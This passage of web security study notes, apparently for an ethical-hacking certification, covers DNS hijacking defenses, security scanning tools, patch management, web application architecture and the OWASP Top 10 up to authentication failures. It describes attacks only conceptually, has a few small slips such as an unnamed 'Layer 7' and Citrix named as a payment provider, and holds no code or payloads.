				- Disallow carriage return (%0D or \r) and line feed (%0A or \n) characters.
				- Comply with RFC 2616 specifications for HTTP/1.1.
				- Parse all user inputs and other forms of encoding before using them in HTTP headers.
			- Proxy Servers:
				- Avoid sharing incoming TCP connections among different clients.
				- Use separate TCP connections with the proxy for different virtual hosts.
				- Implement the "maintain request host header" feature correctly.
	- Defend Against DNS Hijacking:
		- Secure Domain Registration: Choose an ICANN-accredited registrar and enable REGISTRAR-LOCK on your domain.
		- Account & Access Protection: Safeguard registrant credentials, enforce strong password policies, and use multifactor authentication (MFA) and role-based access control (RBAC) for DNS management.
		- DNSSEC Implementation: Deploy Domain Name System Security Extensions (DNSSEC) to prevent unauthorized DNS modifications.
		- Network & Router Security: Change the default router username and password, keep firmware updated, and restrict access to DNS servers based on trusted IP addresses.
		- Monitoring & Alerts: Use DNS monitoring tools to detect unauthorized changes and configure geolocation-based alerts for unusual access.
		- Restrict DNS Access: Use Access Control Lists (ACLs) to limit who can query your DNS servers and restrict zone transfers to trusted sources.
		- Encrypted DNS Queries: Enable DNS over HTTPS (DoH) or DNS over TLS (DoT) to encrypt DNS traffic and prevent interception.
		- DNS Service Provider Security: Choose reliable DNS providers (e.g., Cloudflare, Google Public DNS) with strong service-level agreements (SLAs) and security features.
		- Firewalls & Filtering: Implement firewall protection to filter rogue DNS traffic and use DNS filtering services to block malicious domains.
		- VPN Security: Use reputable VPN services instead of free ones, which may log activities, and establish encrypted VPN tunnels for secure communication.
		- Software & Browser Protection: Install and update antivirus software, use script blockers, and avoid downloading untrusted software.
		- Redundant & Isolated DNS Infrastructure: Set up a master-slave DNS architecture, keeping the master offline and allowing only verified updates.
		- Incident Response Planning: Include DNS hijacking mitigation in business continuity and security response plans.
	- Web Application Security Scanners:
		- Syhunt Hybrid (www.syhunt.com): Syhunt Hybrid automates web application security testing, protecting an organization’s web infrastructure from security threats. Syhunt Dynamic crawls websites and detects vulnerabilities such as XSS, directory traversal issues, fault injection, SQL injection, command execution attempts, and other attacks. Syhunt Hybrid generates signatures to identify application vulnerabilities and prevents session logout. It also analyzes JavaScript (JS), logs suspicious responses, and tests for errors to facilitate review.
		- N-Stalker X (www.nstalker.com): N-Stalker is a web application security scanner that detects vulnerabilities such as clickjacking, SQL injection, and XSS. It supports spider crawling across applications and enables the creation of web macros for form authentication. Additionally, it provides proxy capabilities for "drive-thru" attacks and identifies components through reverse proxies, allowing the distribution of different platforms within the same application URL.
		- Invicti (www.invicti.com)
		- Burp Suite (www.portswigger.net)
		- Wapiti (wapiti-scanner.github.io)
		- WebScarab (owasp.org)
		- WPSec (wpsec.com)
		- Tinfoil Web Scanner (www.tinfoilsecurity.com)
		- Skipfish (code.google.com)
		- Detectify (detectify.com)
		- OpenTextTM FortifyTM On Demand (www.opentext.com)
		- OWASP Zed Attack Proxy (ZAP) (www.zaproxy.org)
		- SonarQube (www.sonarqube.org)
		- Arachni (ecsypno.com)
	- Web Server Security Scanners:
		- Qualys Community Edition (www.qualys.com): Qualys Community Edition helps discover IT assets, manage vulnerabilities, scan web applications, and maintain a cloud asset inventory. It provides vulnerability management to identify and remediate critical security flaws immediately. Additionally, Qualys can assess vulnerabilities across both internal IT infrastructure and external-facing assets to ensure a secure environment.
		- Observatory (observatory.mozilla.org)
		- WordPress Security Scan (hackertarget.com)
		- Web Vulnerability Scanner (pentest-tools.com)
		- Nikto (cirt.net)
		- ImmuniWeb (www.immuniweb.com)
	- Web Server Malware Infection Monitoring Tools:
		- QualysGuard Malware Detection (www.qualys.com): QualysGuard Malware Detection enables organizations to proactively scan their websites for malware, providing automated alerts and detailed reports for swift identification and resolution. It helps protect customers from malware infections and safeguards the organization's brand reputation.
		- Sucuri Site Check (sitecheck.sucuri.net)
		- SiteLock Malware Removal (www.sitelock.com)
		- Quttera (quttera.com)
		- Web Inspector (www.webinspector.com)
		- SiteGuarding (www.siteguarding.com)
	- Web Server Security Tools:
		- OpenText Fortify WebInspect (www.opentext.com): OpenText Fortify WebInspect is an automated dynamic application security testing (DAST) solution that detects configuration issues, identifies security vulnerabilities, and prioritizes risks in running applications. It simulates real-world hacking techniques and delivers a comprehensive dynamic analysis of complex web applications and services. WebInspect’s dashboards and reports provide organizations with enhanced visibility and an accurate assessment of their applications' security posture.
		- Acunetix Web Vulnerability Scanner (www.acunetix.com)
		- NetIQ Secure Configuration Manager (www.netiq.com)
		- SAINT Security Suite (www.carson-saint.com)
		- Sophos Intercept X for Server (www.sophos.com)
		- UpGuard (www.upguard.com)
	- Web Server Penetration Testing Tools:
		- CORE Impact (www.coresecurity.com): CORE Impact helps organizations identify vulnerabilities in their web servers by simulating real-world attack techniques used by cybercriminals. It scans for potential security flaws, imports scan results, and executes exploits to test identified vulnerabilities. Additionally, CORE Impact can assess network servers, workstations, firewalls, routers, and various applications for security gaps. It helps organizations determine which vulnerabilities pose real threats, evaluate the potential impact of exploits, and prioritize remediation efforts effectively.
		- Cobalt Strike (www.cobaltstrike.com)
		- Fuxploider (github.com)
		- Mitmprox (mitmproxy.org)
- Patch Management:
	- Developers constantly strive to identify and fix bugs in web servers. These fixes are distributed as patches, which help protect against known vulnerabilities. However, unpatched systems or improperly applied patches can create security loopholes.
	- Patch:
		- A patch is a small piece of software designed to fix problems, address security vulnerabilities, and improve the usability or performance of a computer program or its supporting data. It acts as a repair for programming issues. A software vulnerability is a weakness in a program that makes it susceptible to malware attacks. To mitigate these risks, software vendors release patches that help prevent exploits and reduce the likelihood of threats taking advantage of specific vulnerabilities.
		- Patches typically include fixes and updates for multiple known bugs or issues. They are publicly released updates available to all customers. A system without regular patch updates is far more vulnerable to attacks. If an attacker discovers a vulnerability before it is patched, the system may be at risk of malware attacks.
	- Hotfix:
		- A hotfix is a package designed to address a critical defect in a live environment. Unlike patches, a hotfix targets a single issue and is applied to a specific product version. Hotfixes provide quick solutions to urgent problems and ensure that critical issues are resolved promptly.
		- Hotfixes should be applied to software patches on production systems. Vendors notify users about the latest hotfixes through email or by making them available on their official website. Unlike patches, hotfixes often address specific customer-reported issues and are not always distributed publicly. Occasionally, vendors release a collection of hotfixes as a combined hotfix or service pack to provide a broader set of fixes.
	- Patch Management:
		- Patch management is a critical aspect of systems management that involves acquiring, testing, and installing multiple patches (code changes) on an administered computer system. It serves as a defense mechanism against vulnerabilities that can cause security weaknesses or data corruption. The process includes scanning for network vulnerabilities, detecting missing security patches and hotfixes, and deploying the necessary patches as soon as they become available to secure the network.
		- Key tasks involved in patch management include:
			- Selecting, verifying, testing, and applying patches
			- Updating previously applied patches with current versions
			- Maintaining a record of patches applied to software
			- Storing repositories or depots of patches for easy access
			- Assigning and deploying patches to relevant systems
		- Automated Patch Management Process:
			- An automated patch management system follows these steps:
				- Detect: Use tools to identify missing security patches.
				- Assess: Evaluate the issue and its severity, considering mitigating factors that may influence the decision.
				- Acquire: Download the patch for testing.
				- Test: Install the patch on a test machine to verify its effects before deployment.
				- Deploy: Apply the patch to computers while ensuring it does not disrupt applications.
				- Maintain: Subscribe to notifications about newly reported vulnerabilities to stay updated.
			- This structured approach ensures that systems remain secure and up to date while minimizing risks associated with patch deployment.
	- Installation of Patch:
		- Identifying Appropriate Sources for Updates and Patches:
			- It is crucial to obtain updates and patches from trusted sources. Installing patches from unverified sources can make the target server more vulnerable to attacks instead of strengthening its security. Therefore, selecting reliable sources plays a vital role in securing web servers.
			- To identify appropriate sources for updates and patches:
				- Develop a patch management plan that aligns with the operational environment and business objectives.
				- Obtain updates and patches directly from the official websites of application or operating system vendors.
				- Register on vendor websites to receive alerts and notifications about relevant updates for proactive patch management.
		- Installation Methods for Patch:
			- Security patches can be accessed and installed via the internet using two methods:
			- Manual Installation – The user downloads the patch from the vendor’s website and installs it manually.
			- Automatic Installation – Applications use an auto-update feature to install patches automatically.
		- Implementation and Verification of Security Patch or Upgrade:
			- Before and after installing a patch, proper validation and monitoring are necessary to ensure security and functionality:
			- Verify the source of the patch before installation.
			- Use a patch management program to validate file versions and checksums before deployment.
			- Ensure that the patch management tool can monitor patched systems effectively.
			- The patch management team should regularly check for updates and patches to keep systems secure.
	- Patch Management Best Practices:
		- Define roles, responsibilities, and procedures for patch management, including timelines and emergency handling.
		- Develop a comprehensive policy for evaluating, testing, approving, and deploying patches.
		- Maintain an updated inventory of all hardware and software to ensure complete coverage.
		- Assess and prioritize patches based on vulnerability severity and asset criticality.
		- Use automation tools to discover, track, and apply patches efficiently.
		- Implement a testing process in a controlled environment to verify patch compatibility and prevent system issues.
		- Establish a regular patching schedule while allowing fast-tracked deployment for critical vulnerabilities.
		- Stay informed on new vulnerabilities and patches through security advisories and feeds.
		- Limit access to patch management tools to authorized personnel.
		- Ensure systems are backed up before patching to facilitate recovery if needed.
		- Verify that patches are successfully applied and functioning as intended.
		- Conduct regular vulnerability scans to identify and address unpatched systems.
		- Protect patch management systems from attacks to prevent compromise.
		- Regularly review and refine patch management processes for continuous improvement.
		- Include third-party applications in the patching strategy.
		- Have a rollback plan in case patches cause unforeseen issues.
		- Align scheduled patching with maintenance windows to minimize disruptions.
	- Patch Management Tools:
		- GFI LanGuard (www.gfi.com): GFI LanGuard is a patch management software that automatically scans the user’s network, installs, and manages both security and non-security patches. It supports devices running Microsoft Windows®, macOS®, and Linux®, along with numerous third-party applications. The software enables automatic downloads of missing patches and offers a rollback feature, ensuring a consistently configured and secure environment protected against threats and vulnerabilities.
		- Symantec Client Management Suite (www.broadcom.com)
		- Solarwinds Patch Manager (www.solarwinds.com)
		- Kaseya Patch Management (www.kaseya.com)
		- Software Vulnerability Manager (www.flexera.com)
		- Ivanti Patch for Endpoint Manager (www.ivanti.com)


--------------------------------------------------

# Hacking Web Applications

- Web Applications:
	- Web applications are software programs that run on web browsers, acting as interfaces between users and web servers. They generate dynamic web pages or execute scripts within the client’s browser, enabling users to interact with databases via a graphical user interface (GUI).
	- Despite security measures, web applications remain vulnerable to threats like SQL injection, cross-site scripting, and session hijacking. Users interact with them using a keyboard, mouse, or touch interface. Built on languages like JavaScript, HTML, and CSS, web applications work with server-side languages like SQL to manage data. They facilitate tasks such as searching, emailing, social networking, online shopping, and order tracking. Some desktop applications also integrate web-based functionalities for enhanced flexibility.
	- Web Application Architecture:
		- Web applications run on web browsers and utilize a combination of server-side scripts (e.g., Java, C#, Ruby, PHP) and client-side scripts (e.g., HTML, JavaScript) to function. The performance of a web application depends on its architecture, which consists of hardware and software that handle tasks such as processing requests, retrieving data, and displaying the required information.
		- Web application architecture involves various devices, web browsers, and external web services that interact with different scripting languages to execute the application. It is typically structured into three layers:
		- Client or Presentation Layer:
			- The client or presentation layer includes all physical devices on the user side, such as laptops, smartphones, and desktop computers. These devices run operating systems and compatible web browsers that allow users to send requests for web applications. When a user enters a URL in the browser, the request is sent to the web server, which processes it, retrieves the required data, and returns a response. This response is then displayed in the browser as a web page.
		- Business Logic Layer:
			- The business logic layer is divided into two sublayers:
			- Web Server Logic Layer:
				- This layer consists of components such as:
				- A firewall that provides security for web content.
				- An HTTP request parser that processes incoming client requests and forwards responses.
				- A proxy caching server that optimizes performance by storing frequently accessed data.
				- An authentication and login handler that manages user authentication.
				- A resource handler that efficiently processes multiple requests.
				- A hardware component (e.g., a physical or cloud-based server).
			- The web server logic layer includes code responsible for handling client requests and returning appropriate responses (e.g., IIS Web Server, Apache Web Server).
			- Business Logic Layer:
				- This layer contains the core functional logic of the web application, implemented using technologies such as .NET, Java, and middleware solutions. It governs data flow and defines the application's behavior. Developers build applications based on this logic using various programming languages. Additionally, this layer manages data storage and facilitates integration with legacy systems while incorporating modern functionalities. The server must use a specific protocol to retrieve user-requested data from the database.
		- Database Layer:
			- The database layer includes:
				- Cloud services for scalable data storage.
				- A B2B layer that manages commercial transactions.
				- A database server that stores and organizes an organization's data in a structured manner (e.g., MS SQL Server, MySQL Server).
			- This layer ensures efficient data management, retrieval, and security for web applications.
	- Web Services:
		- A web service is an application or software deployed over the Internet that enables communication between applications developed on different platforms. It uses standard messaging protocols such as SOAP (Simple Object Access Protocol) to facilitate data exchange. For example, a Java-based service can interact with a PHP-based application. Web services integrate technologies like SOAP, UDDI (Universal Description, Discovery, and Integration), WSDL (Web Services Description Language), and REST (Representational State Transfer) to function across networks.
		- Web Service Architecture:
			- Web service architecture defines how different components interact, including the service provider, service requester, and service registry. These components perform three key operations: publish, find, and bind. Together, they manage software modules (services) and their descriptions.
			- Service Providers create and deploy web services, publishing their service descriptions to a service registry. Service Requesters search for and retrieve service descriptions from the registry. Once located, the requester binds with the service provider to invoke the service.
		- Roles in Web Service:
			- There are three main roles in web service architecture:
			- Service Provider: The entity that offers and hosts web services.
			- Service Requester: The application or client seeking a service. Typically, a web browser acts as a requester, invoking the service on behalf of the user.
			- Service Registry: A centralized repository where providers store service descriptions. The requester searches for available services and retrieves binding data from these descriptions.
		- Operations in Web Service Architecture:
			- Web service architecture includes three core operations:
			- Publish: The service provider publishes service descriptions, making them discoverable to requesters.
			- Find: The requester searches for service descriptions in the registry. This occurs in two phases:
				- Development Phase: The requester retrieves the service interface description.
				- Runtime Phase: The requester obtains binding and location details for invoking the service.
			- Bind: The requester establishes communication with the service provider at runtime, using binding data to locate and invoke the service.
		- Artifacts in Web Service Architecture:
			- Two primary artifacts define web services:
			- Service: A software module provided by the service provider that interacts with requesters. In some cases, a service can also act as a requester by invoking other web services.
			- Service Description: A document containing interface details, service implementation specifications, network locations, binding details, and data types. Stored in a registry, it helps requesters discover and invoke services.
		- Characteristics of Web Services:
			- XML-based: Web services use XML for data representation and transmission, ensuring platform, OS, and network independence. This enhances interoperability between applications providing web services.
			- Coarse-grained Service: Some web service objects contain a large amount of information and offer more functionality compared to fine-grained services. A coarse-grained service is typically composed of multiple fine-grained services.
			- Loosely Coupled: Web services support a loosely coupled architecture for system integration. Systems interact through web APIs by exchanging XML messages. The web API abstracts infrastructure complexities, making the connection more flexible and adaptable.
			- Asynchronous and Synchronous Support: Web services can operate synchronously or asynchronously. In synchronous communication, users wait for a response after making a request. In asynchronous communication, users do not wait for a response. RPC-based and document-based messages are commonly used for both types. Synchronous and asynchronous endpoints are implemented using servlets, SOAP/XML, and HTTP.
			- RPC Support: Web services support Remote Procedure Calls (RPC), similar to traditional applications, allowing functions to be executed remotely.
		- Types of Web Services:
			- Web services are categorized into two types:
			- SOAP Web Services: The Simple Object Access Protocol (SOAP) defines the XML format used to transfer data between the service provider and the requester. SOAP specifies how web services should be built and enables cross-platform data exchange between different programming languages.
			- RESTful Web Services: REpresentational State Transfer (RESTful) web services are designed for efficiency and scalability. They leverage HTTP methods and concepts to define interactions. Unlike SOAP, REST is an architectural style rather than a strict protocol.
		- Components of Web Service Architecture:
			- UDDI (Universal Description, Discovery, and Integration): A directory service that lists and categorizes available web services.
			- WSDL (Web Services Description Language): An XML-based language used to describe and document web services.
			- WS-Security (Web Services Security): An extension of SOAP that ensures the integrity, confidentiality, and authentication of SOAP messages.
			- Other important components of web service architecture include WS-Work Processes, WS-Policy, and WS-Security Policy, which play a crucial role in facilitating communication between applications.
	- Vulnerability Stack:
		- Web applications operate across multiple layers, including custom web applications, third-party components, databases, web servers, operating systems, networks, and security mechanisms. Each layer incorporates various services and protocols to ensure secure access to the application.
		- Organizations prioritize security as a critical component since web applications are common targets for cyberattacks. The vulnerability stack highlights the different layers and the corresponding elements, mechanisms, or services that can be exploited by attackers.
		- Attackers often target one or more of these seven layers to gain unauthorized access to an application or the entire network.
		- Layers of the Vulnerability Stack
			- Layer 7 - Layer: If an attacker discovers vulnerabilities in business logic (implemented using languages such as .NET or Java), they can exploit these weaknesses through input validation attacks such as Cross-Site Scripting (XSS).
			- Layer 6 - Third-Party Components: Third-party components integrate with websites to provide additional functionality (e.g., payment gateways). For instance, when a customer purchases an item on Amazon.com, they may be redirected to a third-party payment provider such as Citrix.com. Attackers can exploit these redirections as entry points to compromise the main website.
			- Layer 5 - Web Servers: Web servers host websites and process user requests. Attackers can perform footprinting on a web server to gather details such as the server name and version by analyzing banners. Using tools like Nmap, they can identify vulnerabilities in a specific web server version by cross-referencing CVE databases and exploiting any weaknesses found.
			- Layer 4 - Databases: Databases store sensitive user information, including user IDs, passwords, and phone numbers. Vulnerabilities within a database can be exploited using tools such as SQLMap, enabling attackers to gain control over the database and extract confidential data.
			- Layer 3 - Operating System: Attackers scan the operating system for open ports and vulnerabilities. They develop malware or backdoors to exploit these weaknesses, often delivering malicious payloads through open ports. If successfully executed, they can compromise the system and escalate their attack to access the website’s database.
			- Layer 2 - Network Infrastructure: Network devices such as routers and switches direct traffic efficiently. Attackers can overload switches with excessive traffic, causing them to behave like hubs. This enables packet sniffing, allowing attackers to capture sensitive data such as user credentials and personal information.
			- Layer 1 - Security Mechanisms (IDS/IPS): Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) monitor network traffic for malicious activity. However, attackers use evasion techniques to bypass these security measures, ensuring their attacks remain undetected while exploiting vulnerabilities in the target system.
- Web Application Threats:
	- OWASP Top 10 Application Security Risks – 2021 (owasp.org):
		- The Open Web Application Security Project (OWASP) is an international organization that maintains a list of the top 10 vulnerabilities and security risks in web applications. The latest OWASP Top 10 application security risks are as follows:
		- A01 – Broken Access Control:
			- This vulnerability occurs when access restrictions for authenticated users are not properly enforced. Attackers can exploit these flaws to gain unauthorized access to functionality and data, such as accessing other user accounts, viewing sensitive files, modifying other users' data, and altering access rights.
			- Access control defines how a web application grants permissions to users for creating, updating, and deleting records, content, or functions while restricting unauthorized access. Broken access control arises when an attacker identifies and exploits weaknesses in these restrictions, bypasses authentication, and compromises the system. These vulnerabilities are widespread due to insufficient automated detection and inadequate functional testing by developers. Attackers can abuse these flaws to impersonate users or administrators, gaining the ability to create, access, modify, or delete records.
			- Common attacks in this category include:
				- Directory Traversal
				- Hidden Field Manipulation
			- Common Access Control Vulnerabilities (OWASP 2021 R3 Revision):
				- Abuse of least privilege or improper default access – Granting excessive permissions to roles, users, or abilities instead of enforcing specific access restrictions.
				- Bypassing access controls – Manipulating URLs, API requests, HTML pages, or application states through parameter tampering, forced browsing, or attack tools.
				- Account takeover via unique identifiers – Gaining unauthorized access to another user’s account by exploiting identifiers.
				- Unauthorized API access – Accessing APIs without proper access controls for PUT, POST, and DELETE requests.
				- Privilege escalation – Allowing a regular user to gain administrative privileges after logging in.
				- Metadata manipulation – Altering hidden fields, JSON Web Tokens (JWTs), cookies, or other access control tokens to bypass authentication or elevate privileges.
				- Exploiting CORS misconfigurations – Accessing APIs from unauthorized sources due to improperly configured cross-origin resource sharing (CORS).
				- Forced browsing – Gaining access to privileged or authenticated pages as an unauthorized or unauthorized user.
		- A02 – Cryptographic Failures/Sensitive Data Exposure:
			- Many web applications and APIs fail to properly protect sensitive data, such as financial information, healthcare records, and personally identifiable information (PII). Developers often make critical mistakes, such as using weak cryptographic keys, failing to update old keys, or not enforcing proper key management. In such cases, sensitive data may be transmitted in plaintext over HTTP, making it vulnerable to interception. Attackers can exploit these weaknesses to steal or modify sensitive data, leading to credit card fraud, identity theft, or other malicious activities. To prevent this, sensitive data must be encrypted both at rest and in transit, with additional security measures when exchanged with a browser.
			- Web applications often store sensitive data, such as passwords, credit card numbers, account records, and authentication credentials, in databases or file systems. If these storage locations are not properly secured, attackers can gain unauthorized access and misuse the information.
			- Cryptographic failures occur when web applications do not adequately protect sensitive data from unauthorized access. Applications rely on cryptographic algorithms to secure data transmission between the server and client, but vulnerabilities such as insecure cryptographic storage and information leakage can lead to exposure. Even when data is encrypted, weak or outdated encryption methods may allow attackers to exploit and steal the information. Poorly implemented encryption can leave sensitive data, such as credit card numbers and Social Security Numbers (SSNs), vulnerable to theft and modification, enabling further attacks like identity theft and fraud.
			- Cryptographic failures can result in severe financial and reputational damage. Organizations must take proactive measures to secure their systems and prevent information leakage by implementing robust encryption practices.
			- Common Attacks in This Category:
				- Cookie Snooping
				- RC4 NOMORE Attack
				- Same-Site Attack
				- Pass-the-Cookie Attack
			- Preventive Measures for Developers:
				- Use strong encryption algorithms – Avoid weak or outdated encryption methods.
				- Secure cryptographic key storage – Ensure encryption keys, certificates, and passwords are stored securely. Insecure storage can allow attackers to retrieve keys and decrypt sensitive data.
				- Ensure proper key management – Regularly rotate cryptographic keys and enforce strong key management policies.
				- Check the randomness of initialization vectors (IVs) – IVs should be securely generated, never reused, and follow best practices in cipher modes of operation.
				- Avoid deprecated hash functions – Do not use outdated hashing algorithms like MD5 and SHA-1 or deprecated padding methods such as PKCS 1/1.5.
				- Prevent cryptographic error leaks – Ensure that error messages and side-channel information do not expose vulnerabilities that attackers can exploit.
				- Implement content-filtering mechanisms – Protect systems and network resources from information leakage through proper filtering.
		- A03 – Injection Flaws:
			- Injection flaws, such as SQL injection and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s malicious input can trick the interpreter into executing unintended commands or accessing data without proper authorization.
			- Injection flaws allow attackers to manipulate an application by injecting harmful code or queries, leading to data loss, corruption, unauthorized access, or denial of service. These vulnerabilities are especially common in legacy code and are frequently found in SQL, LDAP, and XPath queries. Fortunately, they can often be detected using application vulnerability scanners and fuzzing techniques.
			- By exploiting injection flaws, attackers can insert malicious commands or scripts into a web application’s input fields, causing the system to execute unauthorized operations. This can result in the ability to read, modify, delete, or manipulate sensitive data.
			- Injection flaws pose serious security risks, making it essential for developers to validate and sanitize all user input, use parameterized queries, and implement strong security practices to mitigate these attacks.
			- Common Injection Attacks:
				- SQL Injection
				- Command Injection
				- LDAP Injection
				- Cross-Site Scripting (XSS)
				- Buffer Overflow
			- Types of Injection Flaws:
				- SQL Injection: SQL injection is one of the most common vulnerabilities on the internet. It occurs when an application fails to validate user input and allows SQL commands to be executed by the backend database. Attackers inject malicious SQL queries into input fields to gain unauthorized access, retrieve sensitive data, or manipulate database contents.
				- Command Injection: This type of attack occurs when an application improperly validates user input, allowing attackers to inject and execute arbitrary system commands. Because command injection enables attackers to execute system-level operations, it is particularly dangerous.
				- LDAP Injection: LDAP injection occurs when an application constructs LDAP statements based on unsanitized user input. Attackers can exploit this flaw by modifying the LDAP query, granting unauthorized access, or altering directory contents. Using a local proxy, they can inject malicious queries and manipulate the LDAP tree.
				- Cross-Site Scripting (XSS): XSS vulnerabilities occur when an application includes untrusted data in a web page without proper validation or escaping. Attackers inject and execute scripts in a victim’s browser, enabling them to hijack user sessions, deface websites, or redirect users to malicious sites. XSS attacks are possible when an application updates an existing web page with user-supplied data via browser APIs that allow JavaScript execution.
		- A04 – Insecure Design:
			- Insecure design occurs when security controls are not properly implemented during application development, failing to account for the latest business risks. These design flaws can compromise data integrity, confidentiality, and authenticity. Attackers can exploit such weaknesses to perform session hijacking, credential theft, spoofing, and various man-in-the-middle (MITM) attacks.
			- Insecure design flaws arise due to inadequate security considerations during the development phase, leading to critical vulnerabilities such as SQL injection (SQLi) and improperly exposed S3 buckets. A major cause of these vulnerabilities is developers overlooking security threats or lacking sufficient knowledge about them. Additionally, the absence of proper business risk profiling contributes to design insecurities. Attackers often analyze an application’s workflow through threat modeling to identify and exploit security flaws before launching an attack.
			- Common Attacks in This Category:
				- Business Logic Bypass Attack
				- Web-Based Timing Attacks
				- CAPTCHA Attacks
				- Platform Exploits
			- Potential Consequences of Insecure Design:
				- Request Forgery – Manipulating requests to perform unauthorized actions.
				- Authentication Hijacking – Gaining unauthorized access to user sessions or credentials.
				- Identity Theft – Stealing personal or sensitive user information.
				- Data Loss – Corrupting, modifying, or deleting stored data.
				- Denial-of-Service (DoS) Attacks – Disrupting system availability by overwhelming resources.
			- Example:
				- Attackers often exploit poorly implemented APIs that fail to filter and validate requests properly. They specifically target weak APIs that are not integrated with security gateways capable of detecting malicious inputs. By attaching malicious code to a vulnerable API, attackers ensure that when a user accesses the API via an application, the malicious payload is executed, loading along with database content in the user’s browser.
				- To mitigate insecure design vulnerabilities, organizations should incorporate security into every phase of software development, conduct thorough threat modeling, and enforce strong security controls such as API security gateways, input validation, and secure authentication mechanisms.
		- A05 – Security Misconfiguration:
			- Security misconfiguration is one of the most common web security issues, often resulting from improper configuration, insecure default settings, unpatched vulnerabilities, and a lack of regular updates. It can occur due to misconfigured HTTP headers, open S3 buckets, error messages exposing sensitive information, and the failure to patch or upgrade systems, frameworks, dependencies, and components in a timely manner.
			- Poorly configured XML processors, for example, may evaluate external entity references within XML documents, allowing attackers to exploit vulnerabilities through file URI handlers, internal SMB file shares, internal port scanning, remote code execution, or denial-of-service (DoS) attacks such as the billion laughs attack.
			- To mitigate security misconfiguration risks, developers and network administrators must properly configure the entire application stack, including the platform, web server, application server, framework, and custom code. If a server is not configured securely, attackers can exploit vulnerabilities such as unvalidated inputs, parameter tampering, improper error handling, and insufficient transport layer protection.
			- Common Attacks in This Category:
				- XML External Entity (XXE) Attack
				- Unvalidated Redirects and Forwards
				- Directory Traversal
				- Hidden Field Manipulation
			- Key Security Misconfiguration Issues and Their Risks:
				- Unvalidated Inputs:
					- Unvalidated input vulnerabilities occur when a web application does not properly validate user input before processing it. If validation is only enforced on the client side, attackers can bypass it by modifying HTTP requests, URLs, headers, form fields, hidden fields, and query strings. This can lead to cross-site scripting (XSS), buffer overflows, and injection attacks, ultimately resulting in data theft and system compromise.
				- Parameter/Form Tampering:
					- Parameter tampering involves modifying parameters exchanged between the client and server to manipulate application data, such as user credentials, prices, or account balances. Attackers may exploit hidden form fields, cookies, or URL query strings to bypass security measures. Parameter tampering can result in identity theft, unauthorized transactions, and privilege escalation.
				- Improper Error Handling:
					- Improper error handling occurs when a system exposes detailed error messages containing sensitive information about system logic, database structure, or application flaws. Attackers can use these error messages to identify security weaknesses and launch further attacks, including SQL injection, authentication bypass, and DoS attacks.
					- Common error messages revealing vulnerabilities:
						- Null pointer exceptions
						- System call failures
						- Database connection errors
						- Network timeouts
				- Insufficient Transport Layer Protection:
					- This vulnerability occurs when an application fails to encrypt sensitive traffic using strong SSL/TLS configurations. Weak encryption allows attackers to intercept, manipulate, or redirect network traffic, leading to phishing, session hijacking, and man-in-the-middle (MITM) attacks.
					- Example: A user logs into an online banking application without SSL encryption, transmitting credentials in plaintext. Attackers can intercept the session and steal login details.
				- Improper Restriction of XML External Entities (XXE):
					- Older or misconfigured XML processors may allow attackers to exploit external entity references to access internal files, conduct port scans, or execute remote code.
			- Common Server Configuration Issues That Lead to Misconfigurations:
				- Missing security hardening
				- Server software vulnerabilities
				- Enabling unnecessary services
				- Improper authentication mechanisms
				- Unpatched security flaws
				- Default accounts with weak credentials
				- Use of outdated legacy software
			- Mitigation Strategies:
				- Disable default accounts, unused pages, and unprotected files.
				- Regularly patch and update all software components.
				- Implement secure input validation on both client and server sides.
				- Configure proper error handling to prevent information leakage.
				- Enforce strict SSL/TLS protocols for secure communication.
				- Restrict external entity processing in XML configurations.
				- Use automated security scanners to identify misconfigurations.
			- By proactively addressing security misconfigurations, organizations can significantly reduce their attack surface and safeguard their applications from exploitation.
		- A06 – Vulnerable and Outdated Components:
			- Software components such as libraries, frameworks, and modules operate with the same privileges as the application. If these components are not updated or patched in a timely manner, they can introduce serious security vulnerabilities. Attackers can exploit outdated components to compromise sensitive data, take control of servers, or bypass application defenses.
			- Web applications and APIs that rely on vulnerable third-party components expose themselves to significant risks. Since libraries and frameworks execute with full privileges, a flaw in any single component can have severe consequences. Attackers can identify weak components or dependencies by scanning applications, performing manual analysis, or searching exploit databases such as:
				- Exploit Database (www.exploit-db.com)
				- CXSecurity (cxsecurity.com)
				- Zero Day Initiative (www.zerodayinitiative.com)
			- Once a vulnerable component is identified, attackers customize exploits and execute attacks, potentially leading to data breaches, malware injection, or full system takeover. Attackers also use vulnerability scanning tools like Nessus and GFI LanGuard to detect outdated or unpatched software components.
			- Common Conditions That Make Applications Vulnerable:
				- Unknown component versions: When organizations are unaware of the versions of components used, including nested dependencies.
				- Obsolete or unpatched software: When operating systems (OS), databases, web/application servers, and runtime environments remain outdated or unsupported.
				- Lack of regular vulnerability scanning: When applications do not undergo routine security assessments or fail to subscribe to security updates.
				- Delayed updates for core frameworks and dependencies: When organizations fail to apply timely updates or security patches.
				- Compatibility issues with software updates: When updates are not properly tested before deployment, leading to security misconfigurations.
				- Weak security configurations for component files: When configuration files are not properly secured, making them easy targets for attackers.
			- Common Attacks in This Category:
				- Platform Exploits – Attacks targeting vulnerabilities in operating systems, frameworks, and application platforms.
				- Magecart Attack – A cyberattack in which malicious scripts are injected into payment processing pages to steal sensitive credit card data.
				- Buffer Overflow – An attack where an application overwrites memory, potentially allowing execution of malicious code.
			- Mitigation Strategies:
				- Regularly update and patch all components (including dependencies).
				- Monitor vulnerability databases and security advisories for known component flaws.
				- Perform regular security scans to detect and eliminate outdated dependencies.
				- Use software composition analysis (SCA) tools to track and manage third-party components.
				- Test updates in a staging environment before deploying them to production.
				- Ensure secure configurations for all components, including proper access controls.
		- A07 – Identification and Authentication Failures (Broken Authentication):
			- Web applications often misimplement identification, authentication, and session management, making them vulnerable to attacks such as brute-force attacks, password spraying, session hijacking, and account takeovers. These flaws allow attackers to compromise user credentials, session tokens, or authentication keys, leading to identity theft and unauthorized access.
			- Secure identification, authentication, and session management are critical for protecting user accounts. However, many applications fail to implement strong credential functions for actions such as:
				- Changing passwords
				- Resetting forgotten passwords
				- Remembering login credentials
				- Updating account details
			- To enhance security, developers must use robust authentication mechanisms, including cryptographic tokens, multi-factor authentication (MFA), and biometrics. Attackers commonly exploit weak authentication and session management functions, including session ID exposure, inadequate logout mechanisms, poor password management, weak timeout settings, and insecure account recovery processes.
			- Common Authentication and Session Management Vulnerabilities:
				- Session ID in URLs:
					- If session IDs are exposed in URLs, an attacker can steal a session and impersonate the victim.
					- Example:
						- A user logs into http://certifiedhackershop.com, which generates a session ID. An attacker can:
						- Use a network sniffer to intercept the session ID stored in a cookie.
						- Trick the victim into revealing their session ID.
